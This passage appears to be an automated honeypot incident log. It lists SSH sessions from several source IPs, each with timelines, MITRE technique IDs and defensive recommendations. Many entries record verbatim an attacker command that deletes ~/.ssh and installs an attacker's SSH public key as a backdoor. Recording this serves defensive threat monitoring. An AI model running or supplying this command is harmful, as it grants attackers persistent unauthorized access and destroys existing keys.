| **Source IP** | `190.244.39[.]224` |
| **First Seen** | 2026-06-02 07:16 |
| **Last Seen** | 2026-06-02 07:16 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 07:16:32` | `cowrie.session.connect` |
| `2026-06-02 07:16:32` | `cowrie.client.version` |
| `2026-06-02 07:16:32` | `cowrie.client.kex` |
| `2026-06-02 07:16:34` | `cowrie.login.success` |
| `2026-06-02 07:16:34` | `cowrie.session.params` |
| `2026-06-02 07:16:34` | `cowrie.command.input` |
| `2026-06-02 07:16:34` | `cowrie.command.failed` |
| `2026-06-02 07:16:35` | `cowrie.log.closed` |
| `2026-06-02 07:16:36` | `cowrie.session.params` |
| `2026-06-02 07:16:36` | `cowrie.command.input` |
| `2026-06-02 07:16:36` | `cowrie.session.file_download` |
| `2026-06-02 07:16:36` | `cowrie.log.closed` |
| `2026-06-02 07:16:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.244.39[.]224` to AbuseIPDB if not already reported
- [ ] Block `190.244.39[.]224` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77e997feee49

| Field | Detail |
|---|---|
| **Source IP** | `190.244.39[.]224` |
| **First Seen** | 2026-06-02 07:16 |
| **Last Seen** | 2026-06-02 07:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 07:16:40` | `cowrie.session.connect` |
| `2026-06-02 07:16:40` | `cowrie.client.version` |
| `2026-06-02 07:16:41` | `cowrie.client.kex` |
| `2026-06-02 07:16:42` | `cowrie.login.success` |
| `2026-06-02 07:16:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.244.39[.]224` to AbuseIPDB if not already reported
- [ ] Block `190.244.39[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9f89a55ae5f

| Field | Detail |
|---|---|
| **Source IP** | `45.120.115[.]150` |
| **First Seen** | 2026-06-02 07:19 |
| **Last Seen** | 2026-06-02 07:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 07:19:59` | `cowrie.session.connect` |
| `2026-06-02 07:19:59` | `cowrie.client.version` |
| `2026-06-02 07:19:59` | `cowrie.client.kex` |
| `2026-06-02 07:20:00` | `cowrie.login.success` |
| `2026-06-02 07:20:00` | `cowrie.session.params` |
| `2026-06-02 07:20:00` | `cowrie.command.input` |
| `2026-06-02 07:20:00` | `cowrie.command.failed` |
| `2026-06-02 07:20:00` | `cowrie.log.closed` |
| `2026-06-02 07:20:00` | `cowrie.session.params` |
| `2026-06-02 07:20:00` | `cowrie.command.input` |
| `2026-06-02 07:20:00` | `cowrie.session.file_download` |
| `2026-06-02 07:20:00` | `cowrie.log.closed` |
| `2026-06-02 07:20:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.120.115[.]150` to AbuseIPDB if not already reported
- [ ] Block `45.120.115[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-788f58f40ddb

| Field | Detail |
|---|---|
| **Source IP** | `45.120.115[.]150` |
| **First Seen** | 2026-06-02 07:20 |
| **Last Seen** | 2026-06-02 07:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 07:20:01` | `cowrie.session.connect` |
| `2026-06-02 07:20:01` | `cowrie.client.version` |
| `2026-06-02 07:20:01` | `cowrie.client.kex` |
| `2026-06-02 07:20:02` | `cowrie.login.success` |
| `2026-06-02 07:20:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.120.115[.]150` to AbuseIPDB if not already reported
- [ ] Block `45.120.115[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d42f7b93e39c

| Field | Detail |
|---|---|
| **Source IP** | `172.203.134[.]70` |
| **First Seen** | 2026-06-02 07:23 |
| **Last Seen** | 2026-06-02 07:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 07:23:38` | `cowrie.session.connect` |
| `2026-06-02 07:23:38` | `cowrie.client.version` |
| `2026-06-02 07:23:38` | `cowrie.client.kex` |
| `2026-06-02 07:23:39` | `cowrie.login.success` |
| `2026-06-02 07:23:39` | `cowrie.session.params` |
| `2026-06-02 07:23:39` | `cowrie.command.input` |
| `2026-06-02 07:23:39` | `cowrie.command.failed` |
| `2026-06-02 07:23:40` | `cowrie.log.closed` |
| `2026-06-02 07:23:40` | `cowrie.session.params` |
| `2026-06-02 07:23:40` | `cowrie.command.input` |
| `2026-06-02 07:23:40` | `cowrie.session.file_download` |
| `2026-06-02 07:23:40` | `cowrie.log.closed` |
| `2026-06-02 07:23:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.203.134[.]70` to AbuseIPDB if not already reported
- [ ] Block `172.203.134[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6b4959b01d6

| Field | Detail |
|---|---|
| **Source IP** | `172.203.134[.]70` |
| **First Seen** | 2026-06-02 07:23 |
| **Last Seen** | 2026-06-02 07:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 07:23:44` | `cowrie.session.connect` |
| `2026-06-02 07:23:44` | `cowrie.client.version` |
| `2026-06-02 07:23:44` | `cowrie.client.kex` |
| `2026-06-02 07:23:45` | `cowrie.login.success` |
| `2026-06-02 07:23:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.203.134[.]70` to AbuseIPDB if not already reported
- [ ] Block `172.203.134[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55f4c0c8bd11

| Field | Detail |
|---|---|
| **Source IP** | `180.100.217[.]164` |
| **First Seen** | 2026-06-02 07:26 |
| **Last Seen** | 2026-06-02 07:27 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 07:26:56` | `cowrie.session.connect` |
| `2026-06-02 07:26:56` | `cowrie.client.version` |
| `2026-06-02 07:26:56` | `cowrie.client.kex` |
| `2026-06-02 07:26:58` | `cowrie.login.success` |
| `2026-06-02 07:27:00` | `cowrie.session.params` |
| `2026-06-02 07:27:00` | `cowrie.command.input` |
| `2026-06-02 07:27:00` | `cowrie.command.failed` |
| `2026-06-02 07:27:01` | `cowrie.log.closed` |
| `2026-06-02 07:27:01` | `cowrie.session.params` |
| `2026-06-02 07:27:01` | `cowrie.command.input` |
| `2026-06-02 07:27:02` | `cowrie.session.file_download` |
| `2026-06-02 07:27:02` | `cowrie.log.closed` |
| `2026-06-02 07:27:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.100.217[.]164` to AbuseIPDB if not already reported
- [ ] Block `180.100.217[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d42c07f8b8f

| Field | Detail |
|---|---|
| **Source IP** | `180.100.217[.]164` |
| **First Seen** | 2026-06-02 07:27 |
| **Last Seen** | 2026-06-02 07:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 07:27:08` | `cowrie.session.connect` |
| `2026-06-02 07:27:08` | `cowrie.client.version` |
| `2026-06-02 07:27:08` | `cowrie.client.kex` |
| `2026-06-02 07:27:10` | `cowrie.login.success` |
| `2026-06-02 07:27:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.100.217[.]164` to AbuseIPDB if not already reported
- [ ] Block `180.100.217[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4effed5452b9

| Field | Detail |
|---|---|
| **Source IP** | `45.120.115[.]150` |
| **First Seen** | 2026-06-02 07:28 |
| **Last Seen** | 2026-06-02 07:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 07:28:27` | `cowrie.session.connect` |
| `2026-06-02 07:28:27` | `cowrie.client.version` |
| `2026-06-02 07:28:27` | `cowrie.client.kex` |
| `2026-06-02 07:28:27` | `cowrie.login.success` |
| `2026-06-02 07:28:27` | `cowrie.session.params` |
| `2026-06-02 07:28:27` | `cowrie.command.input` |
| `2026-06-02 07:28:27` | `cowrie.command.failed` |
| `2026-06-02 07:28:27` | `cowrie.log.closed` |
| `2026-06-02 07:28:27` | `cowrie.session.params` |
| `2026-06-02 07:28:27` | `cowrie.command.input` |
| `2026-06-02 07:28:27` | `cowrie.session.file_download` |
| `2026-06-02 07:28:27` | `cowrie.log.closed` |
| `2026-06-02 07:28:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.120.115[.]150` to AbuseIPDB if not already reported
- [ ] Block `45.120.115[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d3e0176f662

| Field | Detail |
|---|---|
| **Source IP** | `45.120.115[.]150` |
| **First Seen** | 2026-06-02 07:28 |
| **Last Seen** | 2026-06-02 07:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 07:28:29` | `cowrie.session.connect` |
| `2026-06-02 07:28:29` | `cowrie.client.version` |
| `2026-06-02 07:28:29` | `cowrie.client.kex` |
| `2026-06-02 07:28:29` | `cowrie.login.success` |
| `2026-06-02 07:28:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.120.115[.]150` to AbuseIPDB if not already reported
- [ ] Block `45.120.115[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09ec445d44ab

| Field | Detail |
|---|---|
| **Source IP** | `172.203.134[.]70` |
| **First Seen** | 2026-06-02 07:30 |
| **Last Seen** | 2026-06-02 07:30 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 07:30:26` | `cowrie.session.connect` |
| `2026-06-02 07:30:26` | `cowrie.client.version` |
| `2026-06-02 07:30:26` | `cowrie.client.kex` |
| `2026-06-02 07:30:27` | `cowrie.login.success` |
| `2026-06-02 07:30:28` | `cowrie.session.params` |
| `2026-06-02 07:30:28` | `cowrie.command.input` |
| `2026-06-02 07:30:28` | `cowrie.command.failed` |
| `2026-06-02 07:30:28` | `cowrie.log.closed` |
| `2026-06-02 07:30:29` | `cowrie.session.params` |
| `2026-06-02 07:30:29` | `cowrie.command.input` |
| `2026-06-02 07:30:29` | `cowrie.session.file_download` |
| `2026-06-02 07:30:29` | `cowrie.log.closed` |
| `2026-06-02 07:30:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.203.134[.]70` to AbuseIPDB if not already reported
- [ ] Block `172.203.134[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14203841be78

| Field | Detail |
|---|---|
| **Source IP** | `172.203.134[.]70` |
| **First Seen** | 2026-06-02 07:30 |
| **Last Seen** | 2026-06-02 07:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 07:30:38` | `cowrie.session.connect` |
| `2026-06-02 07:30:38` | `cowrie.client.version` |
| `2026-06-02 07:30:38` | `cowrie.client.kex` |
| `2026-06-02 07:30:39` | `cowrie.login.success` |
| `2026-06-02 07:30:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.203.134[.]70` to AbuseIPDB if not already reported
- [ ] Block `172.203.134[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6554351bf617

| Field | Detail |
|---|---|
| **Source IP** | `190.244.39[.]224` |
| **First Seen** | 2026-06-02 07:31 |
| **Last Seen** | 2026-06-02 07:31 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 07:31:31` | `cowrie.session.connect` |
| `2026-06-02 07:31:31` | `cowrie.client.version` |
| `2026-06-02 07:31:32` | `cowrie.client.kex` |
| `2026-06-02 07:31:33` | `cowrie.login.success` |
| `2026-06-02 07:31:34` | `cowrie.session.params` |
| `2026-06-02 07:31:34` | `cowrie.command.input` |
| `2026-06-02 07:31:34` | `cowrie.command.failed` |
| `2026-06-02 07:31:35` | `cowrie.log.closed` |
| `2026-06-02 07:31:35` | `cowrie.session.params` |
| `2026-06-02 07:31:35` | `cowrie.command.input` |
| `2026-06-02 07:31:36` | `cowrie.session.file_download` |
| `2026-06-02 07:31:36` | `cowrie.log.closed` |
| `2026-06-02 07:31:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.244.39[.]224` to AbuseIPDB if not already reported
- [ ] Block `190.244.39[.]224` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e26f8e263a7

| Field | Detail |
|---|---|
| **Source IP** | `190.244.39[.]224` |
| **First Seen** | 2026-06-02 07:31 |
| **Last Seen** | 2026-06-02 07:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 07:31:40` | `cowrie.session.connect` |
| `2026-06-02 07:31:40` | `cowrie.client.version` |
| `2026-06-02 07:31:40` | `cowrie.client.kex` |
| `2026-06-02 07:31:42` | `cowrie.login.success` |
| `2026-06-02 07:31:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.244.39[.]224` to AbuseIPDB if not already reported
- [ ] Block `190.244.39[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fda91f78d92

| Field | Detail |
|---|---|
| **Source IP** | `45.120.115[.]150` |
| **First Seen** | 2026-06-02 07:39 |
| **Last Seen** | 2026-06-02 07:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 07:39:59` | `cowrie.session.connect` |
| `2026-06-02 07:39:59` | `cowrie.client.version` |
| `2026-06-02 07:39:59` | `cowrie.client.kex` |
| `2026-06-02 07:39:59` | `cowrie.login.success` |
| `2026-06-02 07:39:59` | `cowrie.session.params` |
| `2026-06-02 07:39:59` | `cowrie.command.input` |
| `2026-06-02 07:39:59` | `cowrie.command.failed` |
| `2026-06-02 07:39:59` | `cowrie.log.closed` |
| `2026-06-02 07:39:59` | `cowrie.session.params` |
| `2026-06-02 07:39:59` | `cowrie.command.input` |
| `2026-06-02 07:39:59` | `cowrie.session.file_download` |
| `2026-06-02 07:39:59` | `cowrie.log.closed` |
| `2026-06-02 07:40:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.120.115[.]150` to AbuseIPDB if not already reported
- [ ] Block `45.120.115[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0e36fa2d765

| Field | Detail |
|---|---|
| **Source IP** | `45.120.115[.]150` |
| **First Seen** | 2026-06-02 07:40 |
| **Last Seen** | 2026-06-02 07:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 07:40:01` | `cowrie.session.connect` |
| `2026-06-02 07:40:01` | `cowrie.client.version` |
| `2026-06-02 07:40:01` | `cowrie.client.kex` |
| `2026-06-02 07:40:01` | `cowrie.login.success` |
| `2026-06-02 07:40:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.120.115[.]150` to AbuseIPDB if not already reported
- [ ] Block `45.120.115[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e74f4c376c4a

| Field | Detail |
|---|---|
| **Source IP** | `45.120.115[.]150` |
| **First Seen** | 2026-06-02 07:45 |
| **Last Seen** | 2026-06-02 07:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 07:45:02` | `cowrie.session.connect` |
| `2026-06-02 07:45:02` | `cowrie.client.version` |
